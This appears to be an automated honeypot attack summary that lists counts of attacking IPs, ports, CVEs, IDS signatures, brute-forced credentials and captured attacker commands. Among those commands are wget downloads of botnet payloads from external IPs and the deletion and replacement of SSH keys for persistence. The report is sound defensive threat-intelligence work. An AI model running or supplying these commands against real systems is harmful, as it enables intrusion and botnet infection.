Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-24T19:01:33Z
**Timeframe:** 2025-10-24T18:20:01Z to 2025-10-24T19:00:01Z
**Files Used:**
- agg_log_20251024T182001Z.json
- agg_log_20251024T184001Z.json
- agg_log_20251024T190001Z.json

**Executive Summary**

This report summarizes 27,718 malicious events recorded across the honeypot network. The majority of attacks were captured by the Dionaea and Cowrie honeypots, indicating a high volume of SMB/CIFS and SSH-based attacks. The most prominent attacking IP address was 114.47.12.143, responsible for a significant portion of the observed traffic. A variety of CVEs were targeted, with a focus on remote code execution vulnerabilities. Attackers attempted numerous commands, primarily focused on reconnaissance, disabling security measures, and deploying malicious payloads.

**Detailed Analysis**

**Attacks by Honeypot**
- Dionaea: 9,913
- Cowrie: 6,418
- Honeytrap: 4,806
- Suricata: 4,353
- Ciscoasa: 1,790
- Sentrypeer: 165
- Mailoney: 126
- Tanner: 58
- H0neytr4p: 28
- Redishoneypot: 27
- Adbhoney: 15
- ElasticPot: 12
- Heralding: 3
- Honeyaml: 3
- ConPot: 1

**Top Attacking IPs**
- 114.47.12.143: 9,257
- 109.205.211.9: 2,586
- 80.94.95.238: 1,561
- 185.68.247.151: 936
- 20.80.236.78: 811
- 144.130.11.9: 581
- 20.2.136.52: 503
- 199.127.63.138: 280
- 161.35.25.59: 222
- 107.170.36.5: 252
- 51.159.76.122: 199
- 176.95.247.26: 204
- 155.248.164.42: 200
- 193.24.211.28: 196
- 27.112.78.177: 174
- 46.147.113.91: 267
- 154.88.2.70: 203
- 185.76.32.44: 130
- 154.221.19.162: 116
- 167.250.224.25: 140

**Top Targeted Ports/Protocols**
- 445: 9,855
- 22: 1,089
- 8333: 207
- 5060: 165
- 5903: 143
- 5901: 133
- 25: 126
- 5904: 79
- 5905: 76
- 6379: 27
- TCP/80: 33
- 1521: 31
- TCP/5432: 44
- 80: 48
- 5907: 51
- 5908: 50
- 5909: 50
- 5902: 38
- 27017: 15
- 1024: 13

**Most Common CVEs**
- CVE-2019-11500: 6
- CVE-2021-3449: 3
- CVE-2024-4577: 4
- CVE-2021-41773: 1
- CVE-2021-42013: 1
- CVE-1999-0183: 1

**Commands Attempted by Attackers**
- cd ~; chattr -ia .ssh; lockr -ia .ssh: 17
- lockr -ia .ssh: 17
- cd ~ && rm -rf .ssh && ...: 17
- cat /proc/cpuinfo | grep name | wc -l: 17
- uname: 10
- uname -a: 10
- whoami: 10
- top: 10
- w: 10
- crontab -l: 10
- uname -m: 10
- cat /proc/cpuinfo | grep model | grep name | wc -l: 10
- lscpu | grep Model: 10
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}': 10
- ls -lh $(which ls): 10
- which ls: 10
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}': 10
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}': 10
- rm -rf /tmp/secure.sh; ...: 8
- Enter new UNIX password: : 9

**Signatures Triggered**
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 2,218
- ET HUNTING RDP Authentication Bypass Attempt: 761
- ET DROP Dshield Block Listed Source group 1: 410
- ET SCAN NMAP -sS window 1024: 184
- ET INFO Reserved Internal IP Traffic: 58
- ET SCAN Suspicious inbound to PostgreSQL port 5432: 36
- ET SCAN Potential SSH Scan: 22
- ET SCAN Suspicious inbound to Oracle SQL port 1521: 15
- ET CINS Active Threat Intelligence Poor Reputation IP group 48: 24
- ET CINS Active Threat Intelligence Poor Reputation IP group 49: 24
- ET Cins Active Threat Intelligence Poor Reputation IP group 52: 21

**Users / Login Attempts**
- 345gs5662d34/345gs5662d34: 17
- root/3245gs5662d34: 8
- root/dsm814aa3: 4
- root/dt12345: 4
- root/dti81639: 4
- root/Dtic: 4
- root/SangomaDefaultPassword: 4
- root/1234567890: 5
- nginx/1q2w3e4r: 3
- sati/sati123: 3
- admin/22041970: 3
- user/02041986: 3
- root/pablo123: 2
- invoice/invoice: 2
- testuser/test123: 2

**Files Uploaded/Downloaded**
- sh: 98
- 1.sh;: 2
- arm.urbotnetisass;: 2
- arm.urbotnetisass: 2
- arm5.urbotnetisass;: 2
- arm5.urbotnetisass: 2
- arm6.urbotnetisass;: 2
- arm6.urbotnetisass: 2
- arm7.urbotnetisass;: 2
- arm7.urbotnetisass: 2
- x86_32.urbotnetisass;: 2
- x86_32.urbotnetisass: 2
- mips.urbotnetisass;: 2
- mips.urbotnetisass: 2
- mipsel.urbotnetisass;: 2
- mipsel.urbotnetisass: 2
- &currentsetting.htm=1: 1

**HTTP User-Agents**
- No user agents recorded.

**SSH Clients and Servers**
- No specific SSH clients or servers recorded.

**Top Attacker AS Organizations**
- No AS organizations recorded.

**Key Observations and Anomalies**

- A significant number of commands are geared towards establishing persistent access, particularly through the manipulation of SSH authorized keys. The repeated use of the command `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."` is a clear indicator of this.
- Attackers are also performing extensive system reconnaissance, checking CPU information, memory, and running processes.
- There is evidence of attempts to download and execute malicious scripts from external servers, such as `wget http://94.156.152.237/1.sh` and `wget http://94.154.35.154/arm.urbotnetisass`. These appear to be related to botnet activity.
- The high number of events on port 445 (SMB) suggests widespread scanning for vulnerabilities like EternalBlue.
- A variety of usernames and passwords were attempted, indicating brute-force attacks against common services. The credentials range from default vendor passwords to common weak passwords.
